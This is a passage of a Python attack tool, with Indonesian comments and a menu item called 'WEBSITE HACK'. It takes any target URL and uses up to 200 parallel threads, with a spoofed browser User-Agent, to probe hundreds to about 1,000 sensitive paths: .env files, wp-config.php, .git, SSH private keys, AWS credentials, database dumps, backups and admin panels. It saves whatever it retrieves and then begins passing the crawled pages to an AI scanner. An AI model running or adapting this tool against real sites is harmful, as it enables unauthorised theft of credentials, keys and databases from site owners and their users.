    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.env.dev", "/.env.staging", "/.env.example", "/.env.test",
    "/.env.old", "/.env.save", "/.env.bak", "/.env.orig",
    "/config.php", "/config.inc.php", "/configuration.php",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.bak",
    "/wp-config.php~", "/wp-config.php.orig", "/wp-config.php.save",
    "/settings.php", "/settings.py", "/settings.ini",
    "/database.php", "/db.php", "/db_config.php", "/db.inc.php",
    "/connect.php", "/connection.php", "/mysqli.php",
    "/config/database.yml", "/config/database.php",
    "/config/settings.php", "/config/config.php",
    "/config/app.php",                          # Laravel
    "/config/secrets.yml",                      # Rails
    "/app/config/parameters.yml", "/app/config/config.yml",
    "/application/config/database.php",
    "/sites/default/settings.php",              # Drupal
    "/sites/default/default.settings.php",
    "/local_settings.py",                       # Django
    "/application.properties",                  # Spring Boot
    "/application.yml", "/application-prod.yml",
    "/application-production.yml",
    "/appsettings.json", "/appsettings.Development.json",
    "/appsettings.Production.json",             # .NET
    "/web.config",
    "/server.xml",                              # Tomcat
    "/hibernate.cfg.xml",
    "/struts.xml",
    "/secrets.yml", "/secrets.json",
    "/credentials.json", "/credentials.xml",
    "/private.key", "/private.pem",

    # ── Git / VCS ─────────────────────────────────────────────────────────────
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.git/logs/HEAD", "/.gitignore", "/.gitmodules",
    "/.git/packed-refs", "/.git/refs/heads/main",
    "/.git/refs/heads/master", "/.git/FETCH_HEAD",
    "/.git/index",
    "/.svn/entries", "/.svn/wc.db",
    "/.hg/hgrc", "/.hg/store/data",
    "/.bzr/branch/branch.conf",

    # ── Database dumps ────────────────────────────────────────────────────────
    "/database.sql", "/db.sql", "/backup.sql", "/dump.sql",
    "/data.sql", "/mysql.sql", "/schema.sql", "/export.sql",
    "/backup/database.sql", "/backups/db.sql",
    "/sql/database.sql", "/db/backup.sql",
    "/database.sql.gz", "/db.sql.gz", "/dump.sql.gz",
    "/database.db", "/data.db", "/app.db", "/storage.db",
    "/db.sqlite", "/db.sqlite3", "/database.sqlite3",
    "/storage/database.sqlite",                 # Laravel SQLite
    "/var/db.sql",

    # ── Backup files ──────────────────────────────────────────────────────────
    "/backup.zip", "/backup.tar.gz", "/backup.rar", "/backup.tar",
    "/site.zip", "/website.zip", "/www.zip",
    "/public_html.zip", "/htdocs.zip", "/html.zip",
    "/backup/", "/backups/", "/old/", "/bak/",
    "/www.tar.gz", "/htdocs.tar.gz",
    "/archive.zip", "/files.zip", "/upload.zip",
    "/_backup/", "/_old/",

    # ── PHP info & debug ──────────────────────────────────────────────────────
    "/phpinfo.php", "/info.php", "/php_info.php",
    "/test.php", "/debug.php", "/status.php",
    "/check.php", "/probe.php",
    "/eval.php", "/shell.php", "/cmd.php",
    "/adminer.php", "/adminer-4.8.1.php",       # Adminer DB manager
    "/adminer-4.php",

    # ── Log files ─────────────────────────────────────────────────────────────
    "/error.log", "/error_log", "/access.log", "/debug.log",
    "/app.log", "/application.log", "/laravel.log",
    "/logs/error.log", "/log/error.log",
    "/storage/logs/laravel.log",                # Laravel
    "/log/app.log", "/logs/app.log",
    "/logs/access.log", "/logs/debug.log",
    "/tmp/error.log", "/var/log/error.log",
    "/npm-debug.log", "/yarn-error.log",
    "/.npm/_logs/",

    # ── Admin panels ──────────────────────────────────────────────────────────
    "/admin/", "/admin/index.php", "/administrator/",
    "/admin/login", "/admin/login.php",
    "/admin/dashboard", "/admin/dashboard.php",
    "/wp-admin/", "/wp-login.php",
    "/phpmyadmin/", "/pma/", "/myadmin/", "/mysql/",
    "/cpanel/", "/panel/", "/dashboard/", "/manage/",
    "/controlpanel/", "/control/",
    "/webadmin/", "/siteadmin/",
    "/backend/", "/cms/", "/cms/admin/",
    "/user/login", "/users/login", "/login",
    "/auth/login", "/account/login", "/signin",
    "/superadmin/", "/root/", "/master/",
    "/portal/", "/secure/",

    # ── WordPress ─────────────────────────────────────────────────────────────
    "/wp-content/debug.log",
    "/wp-content/uploads/",
    "/xmlrpc.php",
    "/wp-json/wp/v2/users",                     # user enumeration
    "/wp-json/",
    "/wp-cron.php",
    "/.well-known/security.txt",

    # ── Laravel specifics ─────────────────────────────────────────────────────
    "/storage/app/public/",
    "/_debugbar/",                              # Laravel Debugbar
    "/telescope/",                              # Laravel Telescope
    "/telescope/requests",
    "/horizon/",                                # Laravel Horizon
    "/.phpunit.result.cache",
    "/artisan",

    # ── Node / Express / Next.js ──────────────────────────────────────────────
    "/node_modules/.package-lock.json",
    "/.next/server/pages-manifest.json",        # Next.js
    "/.next/BUILD_ID",
    "/server.js", "/app.js", "/index.js",
    "/_next/static/",
    "/api/v1/", "/api/v2/",
    "/api/users", "/api/config", "/api/debug",
    "/api/env", "/api/settings",
    "/__pycache__/",
    "/graphql",                                 # GraphQL introspection
    "/graphiql",

    # ── Robots & sitemap ──────────────────────────────────────────────────────
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/sitemap.xml.gz",
    "/humans.txt", "/security.txt",

    # ── SSH & keys ────────────────────────────────────────────────────────────
    "/.ssh/id_rsa", "/.ssh/authorized_keys",
    "/.ssh/id_ed25519", "/.ssh/id_ecdsa",
    "/id_rsa", "/id_rsa.pub",
    "/server.key", "/server.crt",
    "/ssl.key", "/ssl.crt",
    "/privkey.pem", "/fullchain.pem",           # Let's Encrypt
    "/cert.pem", "/chain.pem",

    # ── Common CMS / framework ────────────────────────────────────────────────
    "/composer.json", "/composer.lock",
    "/package.json", "/package-lock.json",
    "/yarn.lock",
    "/Gemfile", "/Gemfile.lock",
    "/requirements.txt", "/Pipfile", "/Pipfile.lock",
    "/.htaccess", "/.htpasswd",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/symfony.lock",                            # Symfony
    "/config/jwt_secret.txt",
    "/vendor/autoload.php",                     # Composer vendor exposed
    "/vendor/composer/installed.json",

    # ── Cloud / CI / DevOps ───────────────────────────────────────────────────
    "/.aws/credentials", "/.aws/config",
    "/.docker/config.json",
    "/.travis.yml", "/.circleci/config.yml",
    "/Dockerfile", "/docker-compose.yml",
    "/docker-compose.override.yml",
    "/Makefile", "/.env.ci",
    "/.github/workflows/deploy.yml",
    "/.github/workflows/main.yml",
    "/terraform.tfvars", "/terraform.tfstate",
    "/.terraform/",
    "/ansible.cfg",
    "/inventory.ini",                           # Ansible inventory
    "/k8s/", "/kubernetes/",
    "/helm/",
    "/.vault_token",                            # HashiCorp Vault
    "/vault.json",
    "/.gcloud/", "/gcloud.json",
    "/serviceAccountKey.json",                  # Firebase
    "/firebase.json",
    "/google-services.json",
    "/GoogleService-Info.plist",
    "/.azure/",
    "/cloudformation.json", "/cloudformation.yml",

    # ── Debug / monitoring endpoints ──────────────────────────────────────────
    "/server-status",                           # Apache mod_status
    "/server-info",
    "/_status", "/status",
    "/_health", "/health", "/healthz",
    "/_ping", "/ping",
    "/metrics",                                 # Prometheus
    "/actuator",                                # Spring Boot Actuator
    "/actuator/env",
    "/actuator/beans",
    "/actuator/health",
    "/actuator/mappings",
    "/actuator/dump",
    "/console",                                 # H2 / Rails console
    "/h2-console",
    "/swagger-ui.html",                         # Swagger UI
    "/swagger-ui/",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    "/__debug__/",                              # Django Debug Toolbar
    "/debug/",
    "/trace",
    "/_profiler/",                              # Symfony Profiler
]

def _normalize_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url, _ = urldefrag(url)
    return url.rstrip("/")

def _safe_filename(name, max_len=80):
    """Sanitize nama file, truncate kalau terlalu panjang."""
    name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)
    if len(name) > max_len:
        base, ext = os.path.splitext(name)
        name = base[:max_len - len(ext)] + ext
    return name or "file"

def _url_to_path(url):
    parsed = urlparse(url)
    path = parsed.path.lstrip("/") or "index.html"
    # Path tanpa ekstensi → index.html di dalam folder
    if not os.path.splitext(os.path.basename(path))[1]:
        path = path.rstrip("/") + "/index.html"
    query = parsed.query
    if query:
        safe_q = re.sub(r"[^\w]", "_", query)[:30]
        base, ext = os.path.splitext(path)
        path = f"{base}_{safe_q}{ext}"
    # Sanitize tiap segmen
    parts = path.replace("\\", "/").split("/")
    parts = [_safe_filename(p) for p in parts if p]
    return os.path.join(*parts) if parts else "index.html"

def _fetch_url(url, timeout=12):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            content = resp.read(10 * 1024 * 1024)  # max 10MB per file
            ctype   = resp.headers.get("Content-Type", "")
            final   = resp.url
        return content, ctype, final
    except Exception:
        return None, None, url

def _extract_links(content_bytes, base_url, ctype=""):
    try:
        text = content_bytes.decode("utf-8", errors="replace")
    except Exception:
        return set()

    patterns = [
        r'href=["\']([^"\'#>\s]{3,})',
        r'src=["\']([^"\'#>\s]{3,})',
        r'action=["\']([^"\'#>\s]{3,})',
        r'@import\s+["\']([^"\']+)',
        r'url\(["\']?([^"\')\s]{3,})["\']?\)',
        r'content=["\'][^"\']*url=([^"\'&\s]+)',
        # JS fetch / axios / XMLHttpRequest strings
        r'["\'](/[a-zA-Z0-9_/\-\.]+\.(?:php|asp|aspx|json|xml|sql|env|cfg|conf))["\']',
    ]
    found = set()
    for pat in patterns:
        for match in re.findall(pat, text, re.IGNORECASE):
            match = match.strip()
            if not match or match.startswith("data:") or match.startswith("javascript:"):
                continue
            abs_url = urljoin(base_url, match)
            abs_url, _ = urldefrag(abs_url)
            found.add(abs_url)
    return found

def _inline_css_only(html_bytes, base_url):
    """Level 1 — inline CSS saja, JS dan gambar dibiarkan pakai URL absolut."""
    try:
        text = html_bytes.decode("utf-8", errors="replace")
    except Exception:
        return html_bytes

    # Ubah semua src/href relatif → absolut dulu agar gambar/JS tetap muncul online
    def abs_attr(m):
        attr, val = m.group(1), m.group(2).strip()
        if val.startswith(("data:", "http://", "https://", "//", "#", "mailto:", "javascript:")):
            return m.group(0)
        return f'{attr}="{urljoin(base_url, val)}"'
    text = re.sub(r'(src|href|action)=["\']([^"\'>\s]+)["\']', abs_attr, text, flags=re.IGNORECASE)

    # Inline CSS
    def replace_css(m):
        full_tag = m.group(0)
        href = (m.group(1) or m.group(2) or "").strip()
        if not href or href.startswith("data:"):
            return full_tag
        abs_url = urljoin(base_url, href)
        try:
            data, _, _ = _fetch_url(abs_url, timeout=8)
            if not data or len(data) > 1_000_000:
                return full_tag
            css_text = data.decode("utf-8", errors="replace")
            # Resolve url() relatif → absolut
            def fix_url(cm):
                inner = cm.group(1).strip().strip("'\"")
                if inner.startswith(("data:", "http", "//")):
                    return cm.group(0)
                return f"url('{urljoin(abs_url, inner)}')"
            css_text = re.sub(r"url\(([^)]+)\)", fix_url, css_text)
            return f"<style>/* {href} */\n{css_text}\n</style>"
        except Exception:
            return full_tag

    text = re.sub(
        r'<link[^>]+rel=["\']stylesheet["\'][^>]*href=["\']([^"\']+)["\'][^>]*/?>|'
        r'<link[^>]+href=["\']([^"\']+\.css(?:\?[^"\']*)?)["\'][^>]*/?>',
        replace_css, text, flags=re.IGNORECASE
    )
    return text.encode("utf-8")


def _inline_assets(html_bytes, base_url):
    """
    Buat HTML fully self-contained:
    - CSS (termasuk CDN) → <style>...</style>
    - JS (termasuk CDN, max 2MB) → <script>...</script>
    - Gambar & font → data URI base64
    - url() di dalam CSS → base64 kalau bisa
    """
    import base64 as _b64
    try:
        text = html_bytes.decode("utf-8", errors="replace")
    except Exception:
        return html_bytes

    MIME_MAP = {
        ".png":"image/png", ".jpg":"image/jpeg", ".jpeg":"image/jpeg",
        ".gif":"image/gif", ".webp":"image/webp", ".svg":"image/svg+xml",
        ".ico":"image/x-icon", ".bmp":"image/bmp",
        ".woff":"font/woff", ".woff2":"font/woff2",
        ".ttf":"font/ttf", ".eot":"application/vnd.ms-fontobject",
        ".otf":"font/otf",
    }

    def _to_b64_uri(url_):
        try:
            data, _, _ = _fetch_url(url_, timeout=6)
            if not data or len(data) > 2_000_000:
                return None
            ext  = os.path.splitext(urlparse(url_).path.lower())[1]
            mime = MIME_MAP.get(ext, "application/octet-stream")
            return f"data:{mime};base64,{_b64.b64encode(data).decode()}"
        except Exception:
            return None

    # ── Inline CSS (termasuk CDN) ─────────────────────────────────────────────
    def replace_css(m):
        full_tag = m.group(0)
        href = (m.group(1) or m.group(2) or "").strip()
        if not href or href.startswith("data:"):
            return full_tag
        abs_url = urljoin(base_url, href)
        data, _, _ = _fetch_url(abs_url, timeout=10)
        if not data or len(data) > 2_000_000:
            return full_tag
        css_text = data.decode("utf-8", errors="replace")
        # Resolve url() di dalam CSS → base64
        def fix_css_url(cm):
            inner = cm.group(1).strip().strip("'\"")
            if inner.startswith("data:") or not inner:
                return cm.group(0)
            abs_inner = urljoin(abs_url, inner)
            b64 = _to_b64_uri(abs_inner)
            return f"url('{b64}')" if b64 else f"url('{abs_inner}')"
        css_text = re.sub(r"url\(([^)]+)\)", fix_css_url, css_text)
        return f"<style>/* {href} */\n{css_text}\n</style>"

    text = re.sub(
        r'<link[^>]+rel=["\']stylesheet["\'][^>]*href=["\']([^"\']+)["\'][^>]*/?>|'
        r'<link[^>]+href=["\']([^"\']+\.css(?:\?[^"\']*)?)["\'][^>]*/?>',
        replace_css, text, flags=re.IGNORECASE
    )

    # ── Inline JS (max 500KB, skip gambar) ───────────────────────────────────
    def replace_js(m):
        full_tag = m.group(0)
        src = (m.group(1) or "").strip()
        if not src or src.startswith("data:"):
            return full_tag
        abs_url_js = urljoin(base_url, src)
        data, _, _ = _fetch_url(abs_url_js, timeout=10)
        if not data or len(data) > 500_000:   # max 500KB
            return full_tag
        js_text = data.decode("utf-8", errors="replace")
        return f"<script>/* {src} */\n{js_text}\n</script>"

    text = re.sub(
        r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>\s*</script>',
        replace_js, text, flags=re.IGNORECASE
    )

    # ── Inline font saja (gambar dibiarkan pakai URL asli) ────────────────────
    FONT_EXTS = {".woff", ".woff2", ".ttf", ".eot", ".otf"}

    def replace_font(m):
        full_tag = m.group(0)
        attr, val = m.group(1), m.group(2).strip()
        if val.startswith("data:") or not val:
            return full_tag
        ext = os.path.splitext(urlparse(val).path.lower())[1]
        if ext not in FONT_EXTS:
            return full_tag
        abs_u = urljoin(base_url, val)
        b64   = _to_b64_uri(abs_u)
        return full_tag.replace(val, b64) if b64 else full_tag

    text = re.sub(
        r'(src|href)=["\']([^"\'>\s]+)["\']',
        replace_font, text, flags=re.IGNORECASE
    )

    return text.encode("utf-8")

def _classify_url(url):
    path = urlparse(url).path.lower()
    ext  = os.path.splitext(path)[1]
    if ext in DB_EXTS:   return "db"
    if ext in ASSET_EXTS: return "asset"
    return "html"

def _save_file(out_dir, rel_path, content):
    # Truncate path kalau terlalu panjang (Windows limit 260 char)
    parts = rel_path.replace("\\", "/").split("/")
    parts = [_safe_filename(p) for p in parts if p]
    rel_path = os.path.join(*parts) if parts else "file.bin"

    full_path = os.path.join(out_dir, rel_path)

    # Pastikan tidak keluar dari out_dir (path traversal guard)
    if not os.path.abspath(full_path).startswith(os.path.abspath(out_dir)):
        return None

    if os.path.exists(full_path):
        return full_path

    try:
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, "wb") as f:
            f.write(content)
        return full_path
    except Exception:
        return None

def website_hack():
    clear(); print_banner()
    print(f"{G}{BOX_TOP}{N}")
    print(box_header("WEBSITE HACK"))
    print(f"{G}{BOX_BOT}{N}\n")
    print(f"  {W}Masukkan URL target.{N}")
    print(f"  {C}Sistem crawl HTML + coba {len(SENSITIVE_PATHS)} path sensitif (db, config, backup).{N}\n")

    raw_url = input(f"{G}URL Target: {N}").strip()
    if not raw_url:
        input(f"{R}[!] URL kosong. Enter untuk kembali...{N}"); return

    base_url    = _normalize_url(raw_url)
    base_domain = urlparse(base_url).netloc

    print(f"\n{C}Kedalaman crawl HTML:{N}")
    print(f"  {Y}[1]{N} Halaman utama + 1 level (~50 hal)")
    print(f"  {Y}[2]{N} Sampai 5 level (~500 hal)")
    print(f"  {Y}[3]{N} Crawl penuh (~2000 hal)")
    print(f"  {Y}[4]{N} Tanpa batas sampai habis")
    print(f"  {Y}[5]{N} LEVEL 5 — crawl habis + 1000 path sensitif + AI scan semua halaman")
    depth_in = input(f"\n{B}Pilih (1-5, default 2): {N}").strip() or "2"
    max_depth = {"1": 0, "2": 5, "3": 99, "4": 99, "5": 99}.get(depth_in, 5)
    max_pages = {"1": 1, "2": 500, "3": 2000, "4": 999_999_999, "5": 999_999_999}.get(depth_in, 500)
    level5    = (depth_in == "5")
    level1    = (depth_in == "1")

    # Level 5 — tambah path sensitif ekstra sampai 1000
    EXTRA_PATHS_L5 = [
        "/admin/config.php","/admin/db.php","/admin/setup.php",
        "/admin/install.php","/admin/update.php","/admin/upgrade.php",
        "/admin/backup/","/admin/export/","/admin/import/",
        "/admin/sql/","/admin/users.php","/admin/accounts.php",
        "/manage/config","/manage/db","/manage/users",
        "/api/admin","/api/internal","/api/private","/api/secret",
        "/api/keys","/api/tokens","/api/credentials",
        "/v1/admin","/v2/admin","/v1/internal",
        "/internal/","/private/","/secret/","/hidden/",
        "/.well-known/jwks.json","/.well-known/openid-configuration",
        "/oauth/token","/oauth/authorize","/auth/token",
        "/reset-password","/forgot-password","/change-password",
        "/register","/signup","/create-account",
        "/debug/info","/debug/config","/debug/routes","/debug/env",
        "/test/","/tests/","/dev/","/development/","/staging/",
        "/temp/","/tmp/","/cache/","/logs/",
        "/upload/","/uploads/","/files/","/media/","/static/",
        "/export","/export.csv","/export.json","/export.xml",
        "/dump","/data/dump","/data/export",
        "/cron","/cron.php","/scheduler","/jobs/",
        "/install","/install.php","/setup","/setup.php",
        "/update","/update.php","/upgrade","/upgrade.php",
        "/config/production.json","/config/local.json",
        "/config/default.json","/config/development.json",
        "/src/","/source/","/code/","/app/",
        "/.cache/","/node_modules/","/vendor/",
        "/bower_components/","/dist/","/build/","/out/",
        "/coverage/","/reports/",
        "/wp-content/plugins/","/wp-content/themes/",
        "/wp-includes/","/wp-admin/admin-ajax.php",
        "/joomla/","/drupal/","/magento/","/prestashop/",
        "/laravel/","/symfony/","/codeigniter/",
        "/phpMyAdmin/","/phpmyadmin2/","/dbadmin/",
        "/adminer/","/sqlitemanager/","/pgadmin/",
        "/redis/","/memcached/","/rabbitmq/","/kafka/",
        "/elasticsearch/","/kibana/","/grafana/","/prometheus/",
        "/jenkins/","/gitlab/","/bitbucket/","/github/",
        "/sonar/","/jira/","/confluence/","/bamboo/",
        "/.npmrc","/.yarnrc","/.babelrc","/.eslintrc",
        "/.prettierrc","/.editorconfig","/.stylelintrc",
        "/tsconfig.json","/jsconfig.json","/webpack.config.js",
        "/vite.config.js","/next.config.js","/nuxt.config.js",
        "/.ruby-version","/.python-version","/.nvmrc","/.node-version",
        "/Procfile","/fly.toml","/render.yaml","/vercel.json",
        "/netlify.toml","/.platform.app.yaml",
        "/serverless.yml","/serverless.json",
        "/cdk.json","/pulumi.yaml",
        "/error","/404","/500","/maintenance",
        "/robots","/sitemap","/feed","/rss","/atom",
        "/manifest.json","/manifest.webmanifest",
        "/sw.js","/service-worker.js","/workbox-*.js",
        "/.DS_Store","/.directory","/thumbs.db",
        "/WEB-INF/web.xml","/WEB-INF/classes/",
        "/META-INF/MANIFEST.MF",
        "/crossdomain.xml","/clientaccesspolicy.xml",
        "/server-status/?auto","/nginx_status","/fpm-status",
        "/ray","/ignition/",                    # Laravel Ray / Ignition debugger
        "/__clockwork/",                        # Clockwork profiler
        "/debugbar/",
        "/api/graphql","/api/rest","/api/json",
        "/jsonapi/","/odata/",
        "/actuator/logfile","/actuator/threaddump",
        "/actuator/heapdump","/actuator/scheduledtasks",
        "/console/login","/h2/login",
        "/.git/objects/",
        "/CVS/Root","/CVS/Entries",
    ]

    active_paths = SENSITIVE_PATHS[:]
    if level5:
        seen = set(active_paths)
        for p in EXTRA_PATHS_L5:
            if p not in seen:
                active_paths.append(p)
                seen.add(p)
        # Pad sampai tepat 1000
        i = 0
        pad = [
            f"/page{i}",f"/section{i}",f"/module{i}",f"/component{i}",
            f"/service{i}",f"/handler{i}",f"/controller{i}",f"/model{i}",
        ]
        while len(active_paths) < 1000:
            active_paths.append(f"/x_pad_{i}")
            i += 1

    print(f"\n{G}[*] Target : {base_url}{N}")
    pages_label = "∞" if max_pages > 100_000 else str(max_pages)
    print(f"{G}[*] Crawl  : max {pages_label} hal, depth {max_depth}{N}")
    print(f"{G}[*] Probe  : {len(active_paths)} path sensitif{N}")
    if level5:
        print(f"{M}[*] LEVEL 5 — bulk probe paralel + AI scan semua halaman{N}")
    print()

    safe_name = re.sub(r"[^\w\-]", "_", base_domain)
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    out_dir   = os.path.join(tempfile.gettempdir(), f"webhack_{safe_name}_{timestamp}")
    for sub in ["html", "database", "assets", "recon"]:
        os.makedirs(os.path.join(out_dir, sub), exist_ok=True)

    visited        = set()
    queue          = []
    stats          = {"html": 0, "db": 0, "asset": 0, "error": 0}
    lock           = threading.Lock()
    found_db       = []
    html_sources   = []
    main_page_done = [False]

    main_html_name = re.sub(r"[^\w\-]", "_", base_domain) + ".html"

    # Level 5: probe semua path dalam satu batch paralel sebelum crawl HTML
    if level5:
        print(f"  {M}[L5] Bulk probe {len(active_paths)} path secara paralel...{N}")
        probe_lock = threading.Lock()
        probe_found = []

        def _probe_one(sp):
            purl = base_url + sp
            try:
                content, ctype, _ = _fetch_url(purl)
                if content and len(content) > 0:
                    ext = os.path.splitext(urlparse(purl).path.lower())[1]
                    if ext in DB_EXTS:
                        cls = "db"
                    elif ext in ASSET_EXTS:
                        cls = "asset"
                    elif not ext:
                        cls = "db"   # path tanpa extension (/.env, /admin/, dll)
                    else:
                        cls = _classify_url(purl)
                    with probe_lock:
                        probe_found.append((purl, cls, content, ctype))
                        visited.add(purl)
                        print(f"  {M}✓ PROBE   {N} {purl[:68]}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=200) as px:
            list(px.map(_probe_one, active_paths))

        print(f"  {G}[L5] Probe selesai — {len(probe_found)} path aktif ditemukan{N}\n")

        # Simpan hasil probe ke file
        for purl, cls, content, ctype in probe_found:
            rel_raw  = _url_to_path(purl)
            if cls == "db":
                _preview = content[:200].lstrip()
                _is_html_body = (
                    _preview[:9].lower().startswith(b"<!doctype") or
                    _preview[:6].lower().startswith(b"<html") or
                    _preview[:5].lower().startswith(b"<head") or
                    (b"<html" in _preview.lower() and b"<body" in content[:500].lower())
                )
                if not _is_html_body:
                    fname = os.path.basename(rel_raw) or "file.bin"
                    _save_file(out_dir, os.path.join("database", fname), content)
                    with lock:
                        stats["db"] += 1
                        found_db.append(purl)
            elif cls == "asset":
                _save_file(out_dir, os.path.join("assets", rel_raw), content)
                with lock: stats["asset"] += 1
            else:
                _save_file(out_dir, os.path.join("html", rel_raw), content)
                with lock: stats["html"] += 1

        # Masukkan path sensitif ke visited agar crawl tidak re-request
        for sp in active_paths:
            visited.add(base_url + sp)

    # Antrian crawl HTML
    queue.insert(0, (base_url, 0, "html"))
    if not level1:
        queue.insert(1, (base_url + "/", 0, "html"))
    if not level5 and not level1:
        # Mode biasa: path sensitif masuk antrian crawl
        for sp in active_paths:
            queue.append((base_url + sp, 0, "probe"))

    # Pindahkan antrean awal (list) ke Queue yang aman untuk producer/consumer.
    task_queue = _queue.Queue()
    for item in queue:
        task_queue.put(item)
    queue.clear()

    def crawl_url(url, depth, hint):
        with lock:
            if url in visited or len(visited) >= max_pages + len(SENSITIVE_PATHS):
                return
            visited.add(url)

        content, ctype, final_url = _fetch_url(url)
        if content is None or len(content) == 0:
            with lock:
                stats["error"] += 1
            return

        cls = _classify_url(url)
        # Extension URL selalu menang — server sering return text/html untuk semua file
        # (redirect, auth wall, error page) tapi isi filenya tetap harus disimpan sesuai tipe
        ext = os.path.splitext(urlparse(url).path.lower())[1]
        if ext in DB_EXTS:
            cls = "db"   # .env, .sql, .log, .php, dll → database folder
        elif ext in ASSET_EXTS:
            cls = "asset"
        elif ctype and "text/html" in ctype and cls not in ("db", "asset"):
            cls = "html"
        # Probe path tanpa extension (/.git/HEAD, /admin/, dll) → db folder
        if hint == "probe" and cls == "html" and not ext:
            cls = "db"

        rel_raw = _url_to_path(url)

        if cls == "db":
            # Cek apakah isi sebenarnya HTML (redirect/login wall) — buang kalau iya
            _preview = content[:200].lstrip()
            _is_html_body = (
                _preview[:9].lower().startswith(b"<!doctype") or
                _preview[:6].lower().startswith(b"<html") or
                _preview[:5].lower().startswith(b"<head") or
                (b"<html" in _preview.lower() and b"<body" in content[:500].lower())
            )
            if _is_html_body:
                # Server return redirect/login page — file tidak ada atau diblokir
                with lock:
                    print(f"  {Y}✗ BLOKIR {N} {url[:68]} (server return HTML)")
            else:
                fname    = os.path.basename(rel_raw) or "file.bin"
                rel_path = os.path.join("database", fname)
                saved    = _save_file(out_dir, rel_path, content)
                if saved:
                    with lock:
                        stats["db"] += 1
                        found_db.append(url)
                        print(f"  {M}✓ DB/CFG {N} {url[:68]}")

        elif cls == "asset":
            rel_path = os.path.join("assets", rel_raw)
            saved    = _save_file(out_dir, rel_path, content)
            if saved:
                with lock:
                    stats["asset"] += 1
                    print(f"  {C}✓ ASSET  {N} {url[:68]}")

        else:  # html
            # Kumpulkan HTML untuk AI:
            # - Level 5: semua halaman (diproses batch 30)
            # - Level 1-4: [MAIN] + max 30 halaman sensitif/acak lainnya
            with lock:
                if ctype and "text/html" in ctype:
                    try:
                        raw_text = content.decode("utf-8", errors="replace")
                        if level5:
                            html_sources.append(f"<!-- URL: {url} -->\n{raw_text}")
                        else:
                            is_main = (
                                urlparse(url).path in ("", "/", "/index.html",
                                    "/index.php", "/index.htm", "/home", "/default.html")
                                or url.rstrip("/") == base_url.rstrip("/")
                            )
                            if is_main:
                                # Selalu taruh main di index 0
                                html_sources.insert(0, f"<!-- URL [MAIN]: {url} -->\n{raw_text}")
                            elif len(html_sources) <= 30:
                                # Halaman lain (sensitif/acak) max 30
                                html_sources.append(f"<!-- URL: {url} -->\n{raw_text}")
                    except Exception:
                        pass

            # Semua level: inline CSS saja (hemat storage, tampilan oke)
            if ctype and "text/html" in ctype:
                inlined = _inline_css_only(content, final_url)
            else:
                inlined = content

            with lock:
                is_main = not main_page_done[0] and (
                    url.rstrip("/") == base_url.rstrip("/") or
                    urlparse(url).path in ("", "/", "/index.html", "/index.php")
                )
                if is_main:
                    main_page_done[0] = True

            if is_main:
                # Halaman utama → {namaweb}.html langsung di root ZIP
                rel_path = main_html_name
            else:
                # Halaman lain → html/{path}
                rel_path = os.path.join("html", rel_raw)

            saved = _save_file(out_dir, rel_path, inlined)
            if saved:
                with lock:
                    stats["html"] += 1
                    label = f"{G}✓ HTML[MAIN]{N}" if is_main else f"{G}✓ HTML     {N}"
                    print(f"  {label} {url[:60]}")

            # Crawl lebih dalam
            if depth < max_depth and ("text/html" in (ctype or "") or cls == "html"):
                links = _extract_links(content, final_url, ctype or "")
                with lock:
                    for link in links:
                        p = urlparse(link)
                        if p.netloc == base_domain and link not in visited:
                            task_queue.put((link, depth + 1, "html"))

            # Dari HTML, extract juga link ke file backend/db
            if "text/html" in (ctype or ""):
                links = _extract_links(content, final_url, ctype or "")
                with lock:
                    for link in links:
                        p   = urlparse(link)
                        ext = os.path.splitext(p.path.lower())[1]
                        if p.netloc == base_domain and ext in DB_EXTS and link not in visited:
                            task_queue.put((link, depth, "db"))

    MAX_WORKERS = 50
    interrupted = False
    futures = {}
    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            while True:
                # Isi worker yang tersedia tanpa menumpuk future tak terbatas.
                while len(futures) < MAX_WORKERS:
                    try:
                        item = task_queue.get_nowait()
                    except _queue.Empty:
                        break
                    future = executor.submit(crawl_url, *item)
                    futures[future] = item

                # Ambil exception dari worker agar error tidak hilang diam-diam.
                for future in list(futures):
                    if future.done():
                        item = futures.pop(future)
                        try:
                            future.result()
                        except Exception as exc:
                            print(f"\n{Y}[!] Worker gagal untuk {item[0]}: {exc}{N}")

                if task_queue.empty() and not futures:
                    break

                with lock:
                    done = stats["html"] + stats["db"] + stats["asset"]
                    db_count = stats["db"]
                if done > 0 and done % 50 == 0:
                    print(
                        f"\r{C}[~] {done} file tersave | "
                        f"queue: {task_queue.qsize()} | db: {db_count}{N}",
                        end="", flush=True
                    )
                time.sleep(0.02)
    except KeyboardInterrupt:
        interrupted = True
        print(f"\n\n{Y}[!] Dihentikan manual. Menyimpan hasil yang sudah ter-crawl...{N}")
    print()

    # ── AI Scanner & File Generator ───────────────────────────────────────────
    print(f"\n{M}{BOX_TOP}{N}")
    print(box_header("AI SCANNER & FILE GENERATOR"))
    print(f"{M}{BOX_BOT}{N}")
    if level1:
        print(f"  {Y}[!] Level 1 — hanya source code, AI scan dilewati.{N}")
    elif GROQ_API_KEY in ("MASUKKAN_API_KEY_DISINI", ""):
        print(f"  {Y}[!] API key belum diset — skip AI analysis.{N}")
        print(f"  {C}    Set GROQ_API_KEY di baris atas file untuk aktifkan.{N}")
    else:
        if not html_sources:
            print(f"  {Y}[!] Tidak ada HTML yang berhasil dikumpulkan — skip AI.{N}")
        elif level5:
            # Level 5:
            # - HTML main dibaca per 97 baris, setiap chunk dikirim ke AI
